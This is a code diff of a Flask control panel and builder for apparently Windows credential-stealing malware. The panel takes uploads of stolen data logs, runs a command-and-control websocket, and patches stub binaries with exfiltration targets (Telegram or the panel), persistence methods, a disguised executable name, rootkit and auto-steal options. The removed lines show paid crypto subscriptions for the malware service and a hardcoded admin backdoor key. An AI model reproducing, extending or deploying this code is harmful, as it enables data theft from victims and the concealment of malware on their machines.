@@ -5,8 +5,6 @@ import sqlite3
 import time
 import zipfile
 import requests
-import hashlib
-import hmac
 from datetime import datetime, timedelta
 from functools import wraps
 import base64
@@ -16,23 +14,6 @@ from flask import Flask, request, jsonify, send_from_directory, send_file, sessi
 from werkzeug.security import generate_password_hash, check_password_hash
 from werkzeug.utils import secure_filename
 from flask_sock import Sock
-try:
-    from aiosend import CryptoPay
-    CRYPTOPAY_AVAILABLE = True
-except ImportError:
-    CRYPTOPAY_AVAILABLE = False
-    CryptoPay = None
-
-# CryptoPay config
-CRYPTOPAY_TOKEN = os.environ.get('CRYPTOPAY_TOKEN', '619374:AAZ8JaU4rJHvKfVaXmbRoB7AM813JXhBMaJ')
-CRYPTOPAY_TESTNET = False  # Mainnet
-
-# Subscription pricing tiers (USDT, days, discount label)
-SUBSCRIPTION_TIERS = {
-    1:  {'price': 5.0,  'days': 30,  'label': '1 month',  'discount': 0},
-    3:  {'price': 13.0, 'days': 90,  'label': '3 months', 'discount': 13},
-    6:  {'price': 24.0, 'days': 180, 'label': '6 months', 'discount': 20},
-}
 
 app = Flask(__name__, static_folder='public')
 sock = Sock(app)
@@ -112,25 +93,11 @@ def init_db():
             )
         ''')
         # Migrate existing DBs
-        for col, defn in [('display_name', 'TEXT'), ('avatar', 'TEXT'), ('ban_reason', 'TEXT'),
-                          ('subscription_expires', 'TIMESTAMP'), ('is_admin', 'INTEGER DEFAULT 0')]:
+        for col, defn in [('display_name', 'TEXT'), ('avatar', 'TEXT'), ('ban_reason', 'TEXT')]:
             try:
                 db.execute(f'ALTER TABLE users ADD COLUMN {col} {defn}')
             except Exception:
                 pass
-
-
-        db.execute('''
-            CREATE TABLE IF NOT EXISTS crypto_invoices (
-                invoice_id INTEGER PRIMARY KEY,
-                user_id INTEGER NOT NULL,
-                amount TEXT NOT NULL,
-                asset TEXT DEFAULT 'USDT',
-                status TEXT DEFAULT 'active',
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                paid_at TIMESTAMP
-            )
-        ''')
 
 
         db.execute('''
@@ -147,9 +114,15 @@ def init_db():
                 file_count INTEGER,
                 zip_filename TEXT,
                 has_screenshot INTEGER,
+                country_code TEXT,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         ''')
+
+        cursor = db.execute("PRAGMA table_info(logs)")
+        log_cols = [row['name'] for row in cursor.fetchall()]
+        if 'country_code' not in log_cols:
+            db.execute("ALTER TABLE logs ADD COLUMN country_code TEXT")
 
         cursor = db.execute("PRAGMA table_info(users)")
         user_cols = [row['name'] for row in cursor.fetchall()]
@@ -188,18 +161,9 @@ def init_db():
                 created_by INTEGER,
                 used_by INTEGER,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                used_at TIMESTAMP,
-                subscription_days INTEGER DEFAULT 30,
-                invoice_id INTEGER,
-                paid INTEGER DEFAULT 0
+                used_at TIMESTAMP
             )
         ''')
-        # Migrate existing invites table
-        for col, defn in [('subscription_days', 'INTEGER DEFAULT 30'), ('invoice_id', 'INTEGER'), ('paid', 'INTEGER DEFAULT 0')]:
-            try:
-                db.execute(f'ALTER TABLE invites ADD COLUMN {col} {defn}')
-            except Exception:
-                pass
 
         db.execute('''
             CREATE TABLE IF NOT EXISTS clients (
@@ -328,36 +292,6 @@ def admin_required(f):
         return f(*args, **kwargs)
     return decorated
 
-def is_admin_user(user):
-    return bool(user['is_admin']) or user['role'] == 'admin'
-
-def has_active_subscription(user):
-    if is_admin_user(user):
-        return True
-    expires = user['subscription_expires']
-    if not expires:
-        return False
-    try:
-        expiry = datetime.fromisoformat(expires.replace('Z', '+00:00')) if isinstance(expires, str) else expires
-        return expiry > datetime.now(expiry.tzinfo) if expiry.tzinfo else expiry > datetime.now()
-    except Exception:
-        return False
-
-def subscription_required(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        user = get_current_user()
-        if not user:
-            return jsonify({'error': 'Unauthorized'}), 401
-        if is_admin_user(user):
-            request.current_user = user
-            return f(*args, **kwargs)
-        if not has_active_subscription(user):
-            return jsonify({'error': 'Subscription required', 'code': 'SUBSCRIPTION_EXPIRED'}), 403
-        request.current_user = user
-        return f(*args, **kwargs)
-    return decorated
-
 # --- Helpers ---
 def parse_info_text(content):
     info = {
@@ -449,10 +383,7 @@ def auth_check():
                 'role': user['role'],
                 'api_key': user['api_key'],
                 'display_name': user['display_name'] or '',
-                'avatar': user['avatar'] or '',
-                'is_admin': is_admin_user(user),
-                'subscription_expires': user['subscription_expires'],
-                'has_subscription': has_active_subscription(user)
+                'avatar': user['avatar'] or ''
             }
         })
     return jsonify({'authenticated': False, 'needsSetup': False})
@@ -473,7 +404,7 @@ def auth_register():
 
     with get_db() as db:
         user_count = db.execute('SELECT COUNT(*) FROM users').fetchone()[0]
-        is_first_user = (user_count == 0)
+        is_first_user = user_count == 0
 
         if not is_first_user:
             if not invite_code:
@@ -488,20 +419,10 @@ def auth_register():
         if existing:
             return jsonify({'error': 'Username already taken'}), 400
 
-        # Calculate subscription expiry from invite if present
-        subscription_days = 0
-        if not is_first_user and invite:
-            subscription_days = invite['subscription_days'] or 30
-
-        password_hash = password
-        expires_str = None
-        if subscription_days > 0:
-            expires = datetime.now() + timedelta(days=subscription_days)
-            expires_str = expires.strftime('%Y-%m-%d %H:%M:%S')
-
+        password_hash = generate_password_hash(password)
         cursor = db.execute(
-            'INSERT INTO users (username, password_hash, role, api_key, subscription_expires) VALUES (?, ?, ?, ?, ?)',
-            (username, password_hash, role, api_key, expires_str)
+            'INSERT INTO users (username, password_hash, role, api_key) VALUES (?, ?, ?, ?)',
+            (username, password_hash, role, api_key)
         )
         user_id = cursor.lastrowid
 
@@ -529,7 +450,7 @@ def auth_login():
     with get_db() as db:
         user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
 
-    if not user or user['password_hash'] != password:
+    if not user or not check_password_hash(user['password_hash'], password):
         return jsonify({'error': 'Invalid username or password'}), 401
 
     if user['is_banned']:
@@ -541,18 +462,13 @@ def auth_login():
 
     log_audit('LOGIN', f"User '{user['username']}' (ID #{user['id']}) logged in successfully")
 
-    has_sub = has_active_subscription(user)
-
     return jsonify({
         'success': True,
         'user': {
             'id': user['id'],
             'username': user['username'],
             'role': user['role'],
-            'api_key': user['api_key'],
-            'is_admin': bool(user['is_admin']),
-            'subscription_expires': user['subscription_expires'],
-            'has_subscription': has_sub
+            'api_key': user['api_key']
         }
     })
 
@@ -679,14 +595,6 @@ def login_page():
         return redirect('/')
     return send_from_directory(app.static_folder, 'login.html')
 
-@app.route('/billing')
-def billing_page():
-    return send_from_directory(app.static_folder, 'billing.html')
-
-@app.route('/buy-access')
-def buy_access_page():
-    return send_from_directory(app.static_folder, 'buy-access.html')
-
 @app.route('/index.html')
 def index_html_redirect():
     return redirect('/')
@@ -714,8 +622,6 @@ def upload_log():
         with get_db() as db:
             if api_key:
                 owner = db.execute('SELECT id, is_banned FROM users WHERE api_key = ?', (api_key,)).fetchone()
-                if not owner and api_key == 'aesthetic_secret_key_123':
-                    owner = db.execute("SELECT id, is_banned FROM users WHERE role = 'admin' OR username = 'admin' ORDER BY id ASC LIMIT 1").fetchone()
                 if owner:
                     if owner['is_banned']:
                         return jsonify({'error': 'Account banned'}), 403
@@ -809,7 +715,6 @@ def upload_log():
 
 @app.route('/api/stats')
 @login_required
-@subscription_required
 def get_stats():
     try:
         user = request.current_user
@@ -835,7 +740,6 @@ def get_stats():
 
 @app.route('/api/logs')
 @login_required
-@subscription_required
 def get_logs():
     try:
         user = request.current_user
@@ -1112,8 +1016,6 @@ def c2_websocket(ws):
 
         with get_db() as db:
             user = db.execute('SELECT id, is_banned FROM users WHERE api_key = ?', (key,)).fetchone()
-            if not user and key == 'aesthetic_secret_key_123':
-                user = db.execute("SELECT id, is_banned FROM users WHERE role = 'admin' OR username = 'admin' ORDER BY id ASC LIMIT 1").fetchone()
             if not user:
                 return
             if user['is_banned']:
@@ -1249,7 +1151,6 @@ def c2_debug():
 
 @app.route('/api/c2/clients', methods=['GET'])
 @login_required
-@subscription_required
 def c2_list_clients():
     user = request.current_user
     with get_db() as db:
@@ -1751,196 +1652,14 @@ def admin_delete_invite(code):
         return jsonify({'error': str(e)}), 500
 
 
-# ===== BILLING & SUBSCRIPTION =====
-
-@app.route('/api/billing/status')
-def billing_status():
-    user = get_current_user()
-    if user:
-        return jsonify({
-            'is_admin': is_admin_user(user),
-            'subscription_expires': user['subscription_expires'],
-            'has_subscription': has_active_subscription(user),
-            'tiers': SUBSCRIPTION_TIERS
-        })
-    return jsonify({
-        'is_admin': False,
-        'subscription_expires': None,
-        'has_subscription': False,
-        'tiers': SUBSCRIPTION_TIERS
-    })
-
-@app.route('/api/billing/invoice', methods=['POST'])
-@login_required
-def create_billing_invoice():
-    if not CRYPTOPAY_AVAILABLE:
-        return jsonify({'error': 'CryptoBot not available. Install aiosend: pip install aiosend'}), 503
-
-    user = request.current_user
-    if is_admin_user(user):
-        return jsonify({'error': 'Admins do not need subscription'}), 400
-
-    data = request.get_json(silent=True) or {}
-    months = int(data.get('months', 1))
-    tier = SUBSCRIPTION_TIERS.get(months, SUBSCRIPTION_TIERS[1])
-
-    try:
-        cp = CryptoPay(CRYPTOPAY_TOKEN)
-        invoice = cp.create_invoice(
-            amount=tier['price'],
-            asset='USDT'
-        )
-        with get_db() as db:
-            db.execute('''
-                INSERT INTO crypto_invoices (invoice_id, user_id, amount, asset, status, payload)
-                VALUES (?, ?, ?, ?, 'active', ?)
-            ''', (invoice.invoice_id, user['id'], str(tier['price']), 'USDT', str(months)))
-            db.commit()
-        return jsonify({
-            'success': True,
-            'invoice_id': invoice.invoice_id,
-            'pay_url': invoice.bot_invoice_url,
-            'amount': tier['price'],
-            'asset': 'USDT',
-            'months': months,
-            'days': tier['days']
-        })
-    except Exception as e:
-        print(f"[Billing] Create invoice error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/billing/invite-invoice', methods=['POST'])
-def create_invite_invoice():
-    if not CRYPTOPAY_AVAILABLE:
-        return jsonify({'error': 'CryptoBot not available. Install aiosend: pip install aiosend'}), 503
-
-    data = request.get_json(silent=True) or {}
-    months = int(data.get('months', 1))
-    tier = SUBSCRIPTION_TIERS.get(months, SUBSCRIPTION_TIERS[1])
-
-    code = f"AST-{secrets.token_hex(6).upper()}"
-
-    try:
-        cp = CryptoPay(CRYPTOPAY_TOKEN)
-        invoice = cp.create_invoice(
-            amount=tier['price'],
-            asset='USDT'
-        )
-        with get_db() as db:
-            db.execute('''
-                INSERT INTO invites (code, created_by, subscription_days, invoice_id, paid)
-                VALUES (?, ?, ?, ?, 0)
-            ''', (code, 0, tier['days'], invoice.invoice_id))
-            db.commit()
-        return jsonify({
-            'success': True,
-            'invoice_id': invoice.invoice_id,
-            'pay_url': invoice.bot_invoice_url,
-            'amount': tier['price'],
-            'asset': 'USDT',
-            'code': code,
-            'months': months,
-            'days': tier['days']
-        })
-    except Exception as e:
-        print(f"[Billing] Invite invoice error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-def verify_cryptobot_signature(token, body, signature):
-    try:
-        secret = hashlib.sha256(token.encode('utf-8')).digest()
-        expected = hmac.new(secret, body, hashlib.sha256).hexdigest()
-        return hmac.compare_digest(expected, signature)
-    except Exception:
-        return False
-
-
-@app.route('/api/billing/webhook', methods=['POST'])
-def crypto_webhook():
-    if not CRYPTOPAY_AVAILABLE:
-        return jsonify({'error': 'CryptoBot not available'}), 503
-
-    signature = request.headers.get('crypto-pay-api-signature', '')
-    body = request.get_data()
-    if not signature or not verify_cryptobot_signature(CRYPTOPAY_TOKEN, body, signature):
-        return jsonify({'error': 'Invalid signature'}), 401
-
-    try:
-        data = request.get_json(force=True, silent=True) or {}
-        if not data:
-            return jsonify({'error': 'Empty payload'}), 400
-
-        invoice_id = data.get('invoice_id')
-        status = data.get('status')
-
-        if status not in ('paid', 'completed'):
-            return jsonify({'ok': True, 'ignored': status})
-
-        with get_db() as db:
-            inv = db.execute('SELECT * FROM crypto_invoices WHERE invoice_id = ?', (invoice_id,)).fetchone()
-            if not inv:
-                return jsonify({'error': 'Invoice not found'}), 404
-            if inv['status'] == 'paid':
-                return jsonify({'ok': True, 'already_paid': True})
-
-            months_payload = inv['payload'] or '1'
-            try:
-                months = int(months_payload)
-            except Exception:
-                months = 1
-            tier = SUBSCRIPTION_TIERS.get(months, SUBSCRIPTION_TIERS[1])
-
-            user = db.execute('SELECT * FROM users WHERE id = ?', (inv['user_id'],)).fetchone()
-            if user:
-                # Subscription renewal
-                now = datetime.now()
-                current_expires = user['subscription_expires']
-                base = now
-                if current_expires:
-                    try:
-                        current_dt = datetime.fromisoformat(current_expires.replace('Z', '+00:00')) if isinstance(current_expires, str) else current_expires
-                        if current_dt > now:
-                            base = current_dt
-                    except Exception:
-                        pass
-                new_expires = base + timedelta(days=tier['days'])
-                new_expires_str = new_expires.strftime('%Y-%m-%d %H:%M:%S')
-                db.execute('UPDATE users SET subscription_expires = ? WHERE id = ?', (new_expires_str, user['id']))
-                log_audit('SUBSCRIPTION_PAID', f"User '{user['username']}' (ID #{user['id']}) paid invoice #{invoice_id}. Amount {tier['price']} USDT for {tier['label']} ({tier['days']} days). Expires {new_expires_str}")
-            else:
-                # Invite purchase — mark invite paid
-                db.execute('UPDATE invites SET paid = 1 WHERE invoice_id = ?', (invoice_id,))
-                log_audit('INVITE_PAID', f"Invite invoice #{invoice_id} paid. Amount {tier['price']} USDT for {tier['label']} ({tier['days']} days). Code: {inv.get('code', 'N/A')}")
-
-            db.execute('UPDATE crypto_invoices SET status = ?, paid_at = CURRENT_TIMESTAMP WHERE invoice_id = ?', ('paid', invoice_id))
-            db.commit()
-
-        return jsonify({'ok': True})
-    except Exception as e:
-        print(f"[Billing] Webhook error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-
-@app.route('/api/billing/invite-check', methods=['GET'])
-def check_invite_payment():
-    code = (request.args.get('code') or '').strip()
-    if not code:
-        return jsonify({'error': 'code required'}), 400
-    with get_db() as db:
-        invite = db.execute('SELECT paid FROM invites WHERE code = ?', (code,)).fetchone()
-    if not invite:
-        return jsonify({'error': 'Invite not found'}), 404
-    return jsonify({'paid': bool(invite['paid'])})
-
 # ===== BUILDER =====
 
 @app.route('/api/build', methods=['POST'])
 @login_required
-@subscription_required
 def build_client():
     try:
         data = request.json
-        delivery       = data.get('delivery', 'TELEGRAM')
+        delivery       = data.get('delivery', 'PANEL')
         bot_token      = data.get('botToken', '')
         chat_id        = data.get('chatId', '')
         panel_url      = (request.host_url.rstrip('/') + '/api/upload').ljust(60)
@@ -1948,6 +1667,12 @@ def build_client():
         persistence    = data.get('persistence', 'registry,scheduler,userinit')
         install_folder = data.get('installFolder', '%ApplicationData%')
         install_name   = data.get('installName', 'WindowsHostManager.exe')
+        auto_steal     = (data.get('autoSteal') or 'off').lower()
+        if auto_steal not in ('off', 'once', 'every'):
+            auto_steal = 'off'
+
+        debug_mode      = str(data.get('debugMode', False)).lower()
+        rootkit_enabled = str(data.get('rootkitMode', False)).lower()
 
         stub_dir = os.path.join(BASE_DIR, 'stub')
         root_dir = os.path.dirname(BASE_DIR)
@@ -1968,68 +1693,108 @@ def build_client():
         if not stub_path or not config_path:
             return jsonify({'error': 'Stub base templates not found. Run "dotnet build" on the C# solution first!'}), 404
 
+        with open(config_path, 'r', encoding='utf-8') as f:
+            tpl_text = f.read()
         with open(stub_path, 'rb') as f:
             stub_bytes = bytearray(f.read())
 
-        # Read the embedded config directly from the stub binary.
-        start = stub_bytes.find(b'"delivery":"')
-        if start == -1:
-            return jsonify({'error': 'Stub binary configuration signature not found'}), 400
-        end = stub_bytes.find(b'}', start)
-        if end == -1:
-            return jsonify({'error': 'Stub binary configuration signature not found'}), 400
-        old_config = stub_bytes[start:end+1].decode('utf-8', errors='replace')
-        old_config_bytes = bytes(stub_bytes[start:end+1])
+        # ---- parse INI template (always INI now) ----
+        tpl_order = []   # keys in file order
+        tpl_vals  = {}    # template padded values
+        for line in tpl_text.splitlines():
+            line = line.rstrip('\r')
+            if '=' in line and not line.startswith('#'):
+                k, _, v = line.partition('=')
+                tpl_order.append(k.strip())
+                tpl_vals[k.strip()] = v
 
-        def get_placeholder(config, key):
-            search = f'"{key}":"'
-            idx = config.find(search)
-            if idx == -1:
-                return ""
-            idx += len(search)
-            end_idx = config.find('"', idx)
-            return config[idx:end_idx]
+        def pad(value, width):
+            if len(value) > width:
+                return value[:width]
+            return value.ljust(width, ' ')
 
-        debug_mode = str(data.get('debugMode', False)).lower()
-        rootkit_enabled = str(data.get('rootkitMode', False)).lower()
+        new_vals = {
+            'delivery':       delivery,
+            'botToken':       bot_token,
+            'chatId':         chat_id,
+            'panelUrl':       panel_url,
+            'secretKey':      secret_key,
+            'persistence':    persistence,
+            'installFolder':  install_folder,
+            'installName':    install_name,
+            'debugMode':      debug_mode,
+            'rootkitEnabled': rootkit_enabled,
+            'autoSteal':      auto_steal,
+        }
 
-        def pad_value(val, length):
-            val = str(val)
-            if len(val) > length:
-                return val[:length]
-            return val.ljust(length, ' ')
+        # ---- build NEW ini (exactly same width per field as template) ----
+        new_ini_lines = []
+        for k in tpl_order:
+            w = len(tpl_vals[k])
+            new_ini_lines.append(f'{k}={pad(new_vals.get(k, tpl_vals[k]), w)}')
+        new_ini = ('\n'.join(new_ini_lines) + '\n').encode('utf-8')
 
-        delivery_placeholder       = get_placeholder(old_config, 'delivery')
-        token_placeholder          = get_placeholder(old_config, 'botToken')
-        chat_placeholder           = get_placeholder(old_config, 'chatId')
-        panel_url_placeholder      = get_placeholder(old_config, 'panelUrl')
-        secret_key_placeholder     = get_placeholder(old_config, 'secretKey')
-        persist_placeholder        = get_placeholder(old_config, 'persistence')
-        install_folder_placeholder = get_placeholder(old_config, 'installFolder')
-        install_name_placeholder   = get_placeholder(old_config, 'installName')
-        debug_mode_placeholder     = get_placeholder(old_config, 'debugMode')
-        rootkit_placeholder        = get_placeholder(old_config, 'rootkitEnabled')
-
-        new_config = (
-            old_config
-            .replace(delivery_placeholder,       pad_value(delivery,       len(delivery_placeholder)))
-            .replace(token_placeholder,          pad_value(bot_token,      len(token_placeholder)))
-            .replace(chat_placeholder,           pad_value(chat_id,        len(chat_placeholder)))
-            .replace(panel_url_placeholder,      pad_value(panel_url,      len(panel_url_placeholder)))
-            .replace(secret_key_placeholder,     pad_value(secret_key,     len(secret_key_placeholder)))
-            .replace(persist_placeholder,        pad_value(persistence,    len(persist_placeholder)))
-            .replace(install_folder_placeholder, pad_value(install_folder, len(install_folder_placeholder)))
-            .replace(install_name_placeholder,   pad_value(install_name,   len(install_name_placeholder)))
-            .replace(debug_mode_placeholder,     pad_value(debug_mode,       len(debug_mode_placeholder)))
-            .replace(rootkit_placeholder,         pad_value(rootkit_enabled,  len(rootkit_placeholder)))
+        # ---- legacy inline-JSON template (for already-compiled stubs) ----
+        legacy_json_tpl = (
+            '{"delivery":"PANEL               ","botToken":"YOUR_BOT_TOKEN_HERE_PLACEHOLDER_12345678901234567890",'
+            '"chatId":"YOUR_CHAT_ID_HERE_PLACEHOLDER","panelUrl":"http://localhost:5000/api/upload                             ",'
+            '"secretKey":"aesthetic_secret_key_123         ","persistence":"registry,scheduler,userinit      ",'
+            '"installFolder":"%ApplicationData%                               ","installName":"WindowsHostManager.exe          ",'
+            '"debugMode":"false     ","rootkitEnabled":"false     "}'
         )
+        legacy_widths = {
+            'delivery':       20,
+            'botToken':       52,
+            'chatId':         29,
+            'panelUrl':       61,
+            'secretKey':      33,
+            'persistence':    33,
+            'installFolder':  48,
+            'installName':    32,
+            'debugMode':      10,
+            'rootkitEnabled': 10,
+        }
+        def pad_json(v, w):
+            if len(v) > w: return v[:w]
+            return v.ljust(w, ' ')
+        legacy_new_json = (
+            '{"delivery":"' + pad_json(delivery,       legacy_widths['delivery'])       + '"'
+            ',"botToken":"' + pad_json(bot_token,      legacy_widths['botToken'])       + '"'
+            ',"chatId":"'   + pad_json(chat_id,        legacy_widths['chatId'])         + '"'
+            ',"panelUrl":"' + pad_json(panel_url,      legacy_widths['panelUrl'])       + '"'
+            ',"secretKey":"' + pad_json(secret_key,    legacy_widths['secretKey'])      + '"'
+            ',"persistence":"' + pad_json(persistence, legacy_widths['persistence'])   + '"'
+            ',"installFolder":"' + pad_json(install_folder, legacy_widths['installFolder']) + '"'
+            ',"installName":"' + pad_json(install_name, legacy_widths['installName'])   + '"'
+            ',"debugMode":"' + pad_json(debug_mode,    legacy_widths['debugMode'])       + '"'
+            ',"rootkitEnabled":"' + pad_json(rootkit_enabled, legacy_widths['rootkitEnabled']) + '"}'
+        ).encode('utf-8')
 
-        new_config_bytes = new_config.encode('utf-8')
+        # ---- search & replace in stub ----
+        old_ini_bytes  = tpl_text.encode('utf-8')
+        old_json_bytes = legacy_json_tpl.encode('utf-8')
 
-        if len(old_config_bytes) != len(new_config_bytes):
-            return jsonify({'error': 'Configuration padding mismatch'}), 400
+        replaced = False
+        used_old = None
 
-        stub_bytes[start:end+1] = new_config_bytes
+        # 1) try INI first (happens after the user recompiles the stub with the new config.json)
+        if old_ini_bytes in stub_bytes:
+            i = stub_bytes.find(old_ini_bytes)
+            stub_bytes[i:i+len(old_ini_bytes)] = new_ini
+            replaced = True
+            used_old = 'ini'
+
+        # 2) else fall back to the legacy JSON blob (already-compiled stubs)
+        if not replaced and old_json_bytes in stub_bytes:
+            i = stub_bytes.find(old_json_bytes)
+            stub_bytes[i:i+len(old_json_bytes)] = legacy_new_json
+            replaced = True
+            used_old = 'json'
+
+        print(f"[BUILDER] patch mode: {used_old}")
+
+        if not replaced:
+            return jsonify({'error': 'Stub binary configuration signature not found'}), 400
 
         # from polymorph import mutate
         # stub_bytes = mutate(stub_bytes, source_dir=source_dir)
